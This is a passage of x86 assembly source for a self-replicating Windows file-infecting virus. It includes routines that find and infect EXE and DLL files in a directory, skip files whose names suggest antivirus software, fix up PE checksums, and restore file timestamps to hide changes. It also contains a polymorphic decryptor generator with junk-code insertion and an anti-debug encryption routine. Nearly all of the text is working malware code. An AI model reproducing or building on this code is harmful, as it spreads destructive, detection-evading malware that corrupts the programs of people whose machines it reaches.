           mov     ax,word ptr [esi+5ah]
           cmp     word ptr [pchcks+ebp],ax
           adc     edx,-1
           sub     word ptr [pchcks+ebp],dx
           sub     word ptr [pchcks+ebp],ax
           movzx   ecx,word ptr [pchcks+ebp]
           add     ecx,dword ptr [pad+ebp]
           mov     dword ptr [esi+58h],ecx         ; set new check sum

   infectionErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp] ; delete map view

   infectionErrorCloseMap:
           push    dword ptr [fhmap+ebp]           ; close the mapped file
           call    dword ptr [_CloseHandle+ebp]

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_SetFileTime+ebp]    ; restore file time

   infectionErrorClose:
           push    dword ptr [fHnd+ebp]            ; close the file
           call    dword ptr [_CloseHandle+ebp]

   infectionErrorAttrib:
           push    dword ptr [fileAttrib+ebp]
           push    dword ptr [fNameAddr+ebp]       ; restore attributes
           call    dword ptr [_SetFileAttributesA+ebp]

   infectionError:
           xor     esi,esi                         ; quit SEH
           pop     dword ptr fs:[esi]
           pop     eax
           popad                                   ; restore all
           ret

   infException:                                   ; oh
           xor     esi,esi
           mov     eax,dword ptr fs:[esi]
           mov     esp,dword ptr [eax]
           call    deltaExceptInf
   deltaExceptInf:                                 ; get delta another time
           pop     ebp
           sub     ebp,offset deltaExceptInf
           jmp     infectionError

   ;
   ; Infects all the files in the current directory
   ;   al=0 dll
   ;   al=1 exe
   ;
   infectDir:
           lea     esi,find_data+ebp               ; push find struct
           push    esi

           or      al,al                           ; select between exe or dll
           jz      findDll
           lea     esi,exeMask+ebp
           jmp     findFst
   findDll:
           lea     esi,dllMask+ebp
   findFst:
           push    esi
           call    dword ptr [_FindFirstFileA+ebp] ; Find first file
           inc     eax
           jz      notFound
           dec     eax

           mov     dword ptr [findHnd+ebp],eax

   findNext:
           mov     eax,dword ptr [find_data.nFileSizeHigh+ebp]
           or      eax,eax
           jnz     skipThisFile                    ; too much file for me! haha
           mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
           mov     ecx,PADDING                     ; test if it's infected
           xor     edx,edx                         ; yet
           div     ecx
           or      edx,edx                         ; reminder is zero?
           jz      skipThisFile

   testIfAv:                                       ; let's search for strings
                                                   ; that may appear in av progs
           lea     esi,find_data.cFileName+ebp
           lea     edi,avStrings+ebp
           mov     ecx,vStringsCout
   testIfAvL:
           push    ecx
           mov     ax,word ptr [edi]
           call    filter
           pop     ecx
           jc      skipThisFile
           add     edi,2
           loop    testIfAvL

           lea     esi,find_data.cFileName+ebp
           call    infection

   skipThisFile:
           lea     esi,find_data+ebp
           push    esi
           push    dword ptr [findHnd+ebp]
           call    dword ptr [_FindNextFileA+ebp]  ; Find next file
           or      eax,eax
           jnz     findNext

           push    dword ptr [findHnd+ebp]
           call    dword ptr [_CloseHandle+ebp]    ; close find handle

   notFound:
           ret

   ;
   ;  This is our func that does the partial check sum of the file.
   ;
   ;   in: ecx (fileSize+1) shr 2
   ;       esi offset mappedFile
   ;
   ;  out: eax partial checksum of file
   ;
   CheckSumMappedFile:
           push    esi
           xor     eax, eax
           shl     ecx, 1
           je      func0_saltito0
           test    esi, 00000002h
           je      func0_saltito1
           sub     edx, edx
           mov     dx, word ptr [esi]
           add     eax, edx
           adc     eax, 00000000h
           add     esi, 00000002h
           sub     ecx, 00000002h

   func0_saltito1:
           mov     edx, ecx
           and     edx, 00000007h
           sub     ecx, edx
           je      func0_saltito2
           test    ecx, 00000008h
           je      func0_saltito3
           add     eax, dword ptr [esi]
           adc     eax, dword ptr [esi+04h]
           adc     eax, 00000000h
           add     esi, 00000008h
           sub     ecx, 00000008h
           je      func0_saltito2

   func0_saltito3:
           test    ecx, 00000010h
           je      func0_saltito4
           add     eax, dword ptr [esi]
           adc     eax, dword ptr [esi+04h]
           adc     eax, dword ptr [esi+08h]
           adc     eax, dword ptr [esi+0Ch]
           adc     eax, 00000000h
           add     esi, 00000010h
           sub     ecx, 00000010h
           je      func0_saltito2

   func0_saltito4:
           test    ecx, 00000020h
           je      func0_saltito5
           add     eax, dword ptr [esi]

           adc     eax, dword ptr [esi+04h]
           adc     eax, dword ptr [esi+08h]
           adc     eax, dword ptr [esi+0Ch]
           adc     eax, dword ptr [esi+10h]
           adc     eax, dword ptr [esi+14h]
           adc     eax, dword ptr [esi+18h]
           adc     eax, dword ptr [esi+1Ch]
           adc     eax, 00000000h
           add     esi, 00000020h
           sub     ecx, 00000020h
           je      func0_saltito2

   func0_saltito5:
           test    ecx, 00000040h
           je      func0_saltito6
           add     eax, dword ptr [esi]

           adc     eax, dword ptr [esi+04h]
           adc     eax, dword ptr [esi+08h]
           adc     eax, dword ptr [esi+0Ch]
           adc     eax, dword ptr [esi+10h]
           adc     eax, dword ptr [esi+14h]
           adc     eax, dword ptr [esi+18h]
           adc     eax, dword ptr [esi+1Ch]
           adc     eax, dword ptr [esi+20h]
           adc     eax, dword ptr [esi+24h]
           adc     eax, dword ptr [esi+28h]
           adc     eax, dword ptr [esi+2Ch]
           adc     eax, dword ptr [esi+30h]
           adc     eax, dword ptr [esi+34h]
           adc     eax, dword ptr [esi+38h]
           adc     eax, dword ptr [esi+3Ch]
           adc     eax, 00000000h
           add     esi, 00000040h
           sub     ecx, 00000040h
           je      func0_saltito2

   func0_saltito6:
           add     eax, dword ptr [esi]

           adc     eax, dword ptr [esi+04h]
           adc     eax, dword ptr [esi+08h]
           adc     eax, dword ptr [esi+0Ch]
           adc     eax, dword ptr [esi+10h]
           adc     eax, dword ptr [esi+14h]
           adc     eax, dword ptr [esi+18h]
           adc     eax, dword ptr [esi+1Ch]
           adc     eax, dword ptr [esi+20h]
           adc     eax, dword ptr [esi+24h]
           adc     eax, dword ptr [esi+28h]
           adc     eax, dword ptr [esi+2Ch]
           adc     eax, dword ptr [esi+30h]
           adc     eax, dword ptr [esi+34h]
           adc     eax, dword ptr [esi+38h]
           adc     eax, dword ptr [esi+3Ch]
           adc     eax, dword ptr [esi+40h]
           adc     eax, dword ptr [esi+44h]
           adc     eax, dword ptr [esi+48h]
           adc     eax, dword ptr [esi+4Ch]
           adc     eax, dword ptr [esi+50h]
           adc     eax, dword ptr [esi+54h]
           adc     eax, dword ptr [esi+58h]
           adc     eax, dword ptr [esi+5Ch]
           adc     eax, dword ptr [esi+60h]
           adc     eax, dword ptr [esi+64h]
           adc     eax, dword ptr [esi+68h]
           adc     eax, dword ptr [esi+6Ch]
           adc     eax, dword ptr [esi+70h]
           adc     eax, dword ptr [esi+74h]
           adc     eax, dword ptr [esi+78h]
           adc     eax, dword ptr [esi+7Ch]
           adc     eax, 00000000h
           add     esi, 00000080h
           sub     ecx, 00000080h
           jne     func0_saltito6

   func0_saltito2:
           test    edx, edx
           je      func0_saltito0

   func0_saltito7:
           sub     ecx, ecx
           mov     cx, word ptr [esi]
           add     eax, ecx
           adc     eax, 00000000h
           add     esi, 00000002h
           sub     edx, 00000002h
           jne     func0_saltito7

   func0_saltito0:
           mov     edx, eax
           shr     edx, 10h
           and     eax, 0000FFFFh
           add     eax, edx
           mov     edx, eax
           shr     edx, 10h
           add     eax, edx
           and     eax, 0000FFFFh
           pop     esi
           ret

   ;
   ; [AOCPE] - 'Anvil Of Crom Polymorphic Engine'
   ;
   ;  EAX: HiKey
   ;  EBX: LoKey
   ;  ECX: CodeSize
   ;  EDI: Destination address
   ;
   ; returns EAX: size of generated proc
   ;
   _EAX    equ     0
   _ECX    equ     1
   _EDX    equ     2
   _EBX    equ     3
   _ESP    equ     4
   _EBP    equ     5
   _ESI    equ     6
   _EDI    equ     7

   AOCPE:
           push    edi                             ; save for later use

           mov     dword ptr [RegStatus+ebp],0     ; set this to zero
           mov     dword ptr [RegStatus+ebp+4],0   ; set this to zero
           mov     byte ptr [RegStatus+ebp+_EBP],1 ; EBP non free!
           mov     byte ptr [RegStatus+ebp+_ESP],1 ; ESP non free!
           mov     dword ptr [HiKey+ebp],eax       ; save the keys
           mov     dword ptr [LoKey+ebp],ebx
           xor     edx,edx
           xchg    eax,ecx
           mov     ecx,08h
           div     cx
           mov     dword ptr [CodeSize+ebp],eax    ; and the code size

           call    GetReg                          ; select random key regs
           mov     byte ptr [LoKeyReg+ebp],al

           call    GetReg                          ; select random key regs
           mov     byte ptr [HiKeyReg+ebp],al

           call    AddShit

           mov     cl,_EBP                         ; push ebp
           call    AddPushREG

           call    AddShit

           mov     ax,0ec8bh                       ; mov ebp,esp
           stosw

           call    AddShit

           mov     edx,04h
           mov     cl,_EBP
           call    AddMovREGMEMEBP                 ; get call address

           ; now we have the address of code to decrypt into EBP

           mov     cl,byte ptr [LoKeyReg+ebp]      ; push LoKeyReg
           call    AddPushREG

           call    AddShit

           mov     cl,byte ptr [HiKeyReg+ebp]      ; push HiKeyReg
           call    AddPushREG

           call    dword ptr [_GetTickCount+ebp]
           and     eax,15
           mov     ecx,eax
           mov     ebx,ecx
           xor     eax,edi
   AOCPELOOP0:
           add     eax,029a0beeh
           sub     dword ptr [LoKey+ebp],eax       ; get modifiers
           push    eax
           loop    AOCPELOOP0

           mov     cl,byte ptr [LoKeyReg+ebp]      ; store LoKey
           mov     edx,dword ptr [LoKey+ebp]
           call    AddMovREGINM

           mov     ecx,ebx
   AOCPELOOP1:
           pop     eax
           push    ecx
           mov     cl,byte ptr [LoKeyReg+ebp]      ; add modifiers
           mov     edx,eax
           call    AddAddREGINM
           pop     ecx
           loop    AOCPELOOP1

           call    dword ptr [_GetTickCount+ebp]   ; get modifiers
           and     eax,15
           mov     ecx,eax
           mov     ebx,ecx
           xor     eax,edi
   AOCPELOOP2:
           add     eax,029a0beeh
           sub     dword ptr [HiKey+ebp],eax
           push    eax
           loop    AOCPELOOP2

           mov     cl,byte ptr [HiKeyReg+ebp]      ; store HiKey
           mov     edx,dword ptr [HiKey+ebp]
           call    AddMovREGINM

           mov     ecx,ebx
   AOCPELOOP3:
           pop     eax
           push    ecx
           mov     cl,byte ptr [HiKeyReg+ebp]      ; add modifiers
           mov     edx,eax
           call    AddAddREGINM
           pop     ecx
           loop    AOCPELOOP3

           call    GetReg
           mov     byte ptr [LoopReg+ebp],al

           mov     cl,al                           ; push LoopReg
           call    AddPushREG

           call    AddShit

           mov     cl,byte ptr [LoopReg+ebp]       ; mov loops
           mov     edx,dword ptr [CodeSize+ebp]
           call    AddMovREGINM

           call    AddShit

           push    edi

           mov     cl,byte ptr [LoKeyReg+ebp]
           call    AddXorMEMEBPREG
           mov     cl,byte ptr [LoKeyReg+ebp]
           mov     edx,01020304h
           call    AddAddREGINM

           call    AddShit

           mov     cl,_EBP
           mov     edx,04h
           call    AddAddREGINM

           mov     cl,byte ptr [HiKeyReg+ebp]
           call    AddXorMEMEBPREG
           mov     cl,byte ptr [HiKeyReg+ebp]
           mov     edx,01020304h
           call    AddSubREGINM

           call    AddShit

           mov     cl,_EBP
           mov     edx,04h
           call    AddAddREGINM

           mov     cl,byte ptr [LoopReg+ebp]       ; sub LoopReg,1
           mov     edx,1
           call    AddSubREGINM

           pop     ebx                             ; jnz xxxxxxxxxxx
           mov     eax,edi
           sub     eax,ebx
           push    eax
           mov     al,75h
           stosb
           pop     eax
           mov     ah,0feh
           xchg    al,ah
           sub     al,ah
           stosb

           call    AddShit

           mov     cl,byte ptr [LoopReg+ebp]       ; pop LoopReg
           call    AddPopREG

           call    AddShit

           mov     al,byte ptr [LoopReg+ebp]       ; free the register
           call    FreeReg

   AOCPEEND:
           mov     cl,byte ptr [HiKeyReg+ebp]      ; pop HiKeyReg
           call    AddPopREG

           call    AddShit

           mov     cl,byte ptr [LoKeyReg+ebp]      ; pop LoKeyReg
           call    AddPopREG

           call    AddShit

           mov     cl,_EBP                         ; pop EBP
           call    AddPopREG

           mov     al,0c3h                         ; ret ;)
           stosb

           pop     esi
           sub     edi,esi
           mov     eax,edi                         ; return size of generated
           ret

   ;
   ; returns AL: selected register
   ;
   GetReg:
           xor     eax,eax
           mov     al,byte ptr [HiKey+ebp]
   GetReg1:
           and     al,7
           lea     ecx,RegStatus+ebp
           add     ecx,eax
           mov     dl,byte ptr [ecx]
           or      dl,dl
           jz      GetReg0
           inc     al
           jmp     GetReg1
   GetReg0:
           mov     byte ptr [ecx],1
           ret

   ;
   ;  AL: selected register to free
   ;
   FreeReg:
           and     eax,7
           lea     ecx,RegStatus+ebp
           add     ecx,eax
           mov     byte ptr [ecx],0
           ret

   ;
   ; Polymorphic engine data
   ;
   RegStatus       db      8 dup(0)                ; 1: used 0: free
   LoKeyReg        db      0
   HiKeyReg        db      0
   LoopReg         db      0
   LoKey           dd      0
   HiKey           dd      0
   CodeSize        dd      0

   ;
   ;  Instruction generators
   ;
   ;  EDI: Destination code
   ;  ECX: Reg (if aplicable)
   ;  EDX: Inm (if aplicable)
   ;

   AddPushREG:
           mov     al,050h
           add     al,cl
           stosb
           ret

   AddPopREG:
           mov     al,058h
           add     al,cl
           stosb
           ret

   AddMovREGINM:
           mov     al,0b8h
           add     al,cl
           stosb
           mov     eax,edx
           stosd
           ret

   AddMovREGMEMEBP:
           mov     al,08bh
           stosb
           mov     al,08h
           mul     cl
           add     al,85h
           stosb
           mov     eax,edx
           stosd
           ret

   AddXorMEMEBPREG:
           mov     al,031h
           stosb
           mov     al,08h
           mul     cl
           add     al,45h
           stosb
           xor     al,al
           stosb
           ret

   AddAddREGINM:
           or      cl,cl
           jnz     AddAddREGINM0
           mov     al,05h
           stosb
           jmp     AddAddREGINM1
   AddAddREGINM0:
           mov     al,081h
           stosb
           mov     al,0c0h
           add     al,cl
           stosb
   AddAddREGINM1:
           mov     eax,edx
           stosd
           ret

   AddSubREGINM:
           or      cl,cl
           jnz     AddSubREGINM0
           mov     al,2dh
           stosb
           jmp     AddSubREGINM1
   AddSubREGINM0:
           mov     al,081h
           stosb
           mov     al,0e8h
           add     al,cl
           stosb
   AddSubREGINM1:
           mov     eax,edx
           stosd
           ret

   AddShit:
           mov     ah,byte ptr [HiKey+ebp]
           cmp     ah,88h
           ja      insJmp

           mov     bh,ah

           call    GetReg
           mov     bl,al

           mov     cl,bl
           call    AddPushREG

           cmp     bh,88h
           ja      insShitL0

   insShitL1:

           mov     cl,bl
           mov     edx,edi
           call    AddSubREGINM

           jmp     insShitL3

   insShitL0:
           xor     bh,bl
           mov     cl,bl
           xor     edx,edi
           call    AddAddREGINM

           cmp     bh,88h
           ja      insShitL1

   insShitL3:
           mov     cl,bl
           call    AddPopREG

           mov     al,bl
           call    FreeReg
           ret

   insJmp:
           xor     eax,edi
           or      ah,ah
           jnz     AddShit0
           add     ah,10
   AddShit0:
           and     ah,15
           mov     al,0ebh
           stosw
           movzx   eax,ah
           add     edi,eax
           ret

   ;
   ;       Searches for the word in ax the zstring addr by esi
   ;       found = stc
   ;       not found = clc
   ;
   filter:
           push    esi                             ; doesn't change esi
           push    esi                             ; 1st get the size of
           xor     ecx,ecx                         ; the zstring
   filter0:
           cmp     byte ptr [esi],0                ; get string size and
           je      filter1                         ; change to upper case
           cmp     byte ptr [esi],'a'
           jb      filterCont
           cmp     byte ptr [esi],'z'
           ja      filterCont
           sub     byte ptr [esi],'a'-'A'
   filterCont:
           inc     ecx
           inc     esi
           jmp     filter0

   filter1:
           pop     esi                             ; now search
           jmp     filter4
   filter2:
           cmp     word ptr [esi],ax
           jne     filter3
           pop     esi
           stc
           ret
   filter3:
           inc     esi
           dec     ecx
   filter4:
           cmp     ecx,2
           jnb     filter2
           pop     esi
           clc
           ret

   ;
   ; Different calls to LENDE
   ;
   CLENDE0:
           mov     esi,LENDE0
           mov     edi,LENDESIZE0
           mov     edx,offset littleCrypt0-offset inicio
           mov     ecx,offset littleCrypt1-offset littleCrypt0
           jmp     LENDE

   CLENDE1:
           mov     esi,LENDE1
           mov     edi,LENDESIZE1
           mov     edx,offset littleCrypt2-offset inicio
           mov     ecx,offset littleCrypt3-offset littleCrypt2
           jmp     LENDE

   CLENDE2:
           mov     esi,LENDE2
           mov     edi,LENDESIZE2
           mov     edx,offset littleCrypt4-offset inicio
           mov     ecx,offset littleCrypt5-offset littleCrypt4

   ;
   ;  Little ENcryptor/DEcryptor
   ;
   ;  IN:
   ;      esi      offset of code to do CRC32 and get key
   ;      edi      size of code addressed by esi
   ;      edx      offset of code to encrypt/decrypt
   ;      ecx      size of code to encrypt/decrypt
   ;
   LENDE:
           pushad
           or      al,al
           jz      decrypt
           lea     ebx,tmpVirus+ebp
           jmp     skipDecrypt
   decrypt:
           lea     ebx,inicio+ebp
   skipDecrypt:
           push    ecx edx ebx
           add     esi,ebx
           call    CRC32
           pop     ebx edx ecx

           xor     edi,edi                         ; anti-debug
           mov     edi,dword ptr fs:[edi+20h]      ; fs:[20h] must be zero
           add     eax,edi                         ; else LENDE fails ;)

           xor     al,ah
           and     al,byte ptr [lendeFlag+ebp]

           mov     esi,edx
           add     esi,ebx
   LENDELoop:
           add     byte ptr [esi],ah
           xor     byte ptr [esi],al
           sub     byte ptr [esi],ah
           inc     esi
           loop    LENDELoop
           popad
           ret
   lendeFlag       db      0                       ; argh! needed for 1st gen :(
   endLENDE:
   vEnd    label   byte
   cryptEnd:
   crypt:                                          ; dummy decryption routine
           ret                                     ; for 1st generation

   ; there is the data that is not stored in the file...
   ; buffer for 1st generation
   BEGINOFBUFFER   equ     offset $
   ; needed for API search ----------------------------------------------------
   address         dd      0
   names           dd      0
   ordinals        dd      0
   nexports        dd      0
   expcount        dd      0
   kernel32        dd      0
   ; for infection ------------------------------------------------------------
   fHnd            dd      0
   fhmap           dd      0
   mapMem          dd      0

   fileSize        dd      0
   fileAttrib      dd      0
   fileTime0       dd      0,0
   fileTime1       dd      0,0
   fileTime2       dd      0,0
   pad             dd      0
   fNameAddr       dd      0
   pchcks          dw      0
   gensize         dd      0
   ; for find files -----------------------------------------------------------
   find_data               WIN32_FIND_DATA <?>     ; for finf and findn
   findHnd                 dd      0               ; find handle
   ; for store directories ----------------------------------------------------
   currentPath     db      pathSize dup(0)         ; to store paths
   tempPath        db      pathSize dup(0)         ; to store paths
   ; buffer to work with virus body -------------------------------------------
   tmpVirus:       db      (offset cryptEnd-offset inicio) dup(0)
   polyBuffer:     db      1000h dup(0)
   sizeOfBuffer    equ     offset $-BEGINOFBUFFER
   ; --------------------------------------------------------------------------
   ; end of 1st gen buffer

   ;
   ; host
   ;
   exit:
           push    0h
           call    ExitProcess
           jmp     exit

   Ends
   End     inicio
   ;
   ; Beginig of appendig comment virus ----------------------------------------
   ;
   ; Learn spanish with the bee...
   ; lesson 1: basic speech level
   ;
   ;           'Bentanucoh dohm¡: ¨Ande ki‚s ieg  oi?'
   ;
   ; Appendig comment virus ends here -----------------------------------------
   ;
